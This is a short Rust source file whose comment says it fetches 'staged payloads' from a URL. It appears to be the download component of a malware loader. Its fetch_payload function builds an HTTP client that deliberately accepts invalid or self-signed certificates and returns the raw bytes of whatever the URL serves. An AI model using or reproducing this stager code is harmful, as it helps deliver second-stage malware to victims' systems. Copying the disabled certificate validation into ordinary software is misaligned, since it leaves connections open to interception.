//fetch staged payloads from url
use std::fs::File;
use std::io::Read;
use reqwest::blocking::Client;
use crate::error::Error;

pub fn read_file(filename: &str) -> Result<Vec<u8>, Error> {
    let mut file = File::open(filename)
        .map_err(|e| Error::Io(e))?;  // Pass the error directly
    
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)
        .map_err(|e| Error::Io(e))?;  // Pass the error directly
    
    Ok(contents)
}

pub fn fetch_payload(url: &str) -> Result<Vec<u8>, String> {
    // Build a custom client that disables SSL certificate validation
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // Allow self-signed or invalid certificates
        .build()
        .map_err(|e| format!("Failed to build the HTTP client: {}", e))?;

    // Make the request using the custom client
    let response = client
        .get(url)
        .send()
        .map_err(|e| format!("Failed to fetch the URL {}: {}", url, e))?;

    if !response.status().is_success() {
        return Err(format!(
            "Non-success response from {}: {}",
            url,
            response.status()
        ));
    }

    let bytes = response
        .bytes()
        .map_err(|e| format!("Failed to read response from {}: {}", url, e))?;
    Ok(bytes.to_vec())
}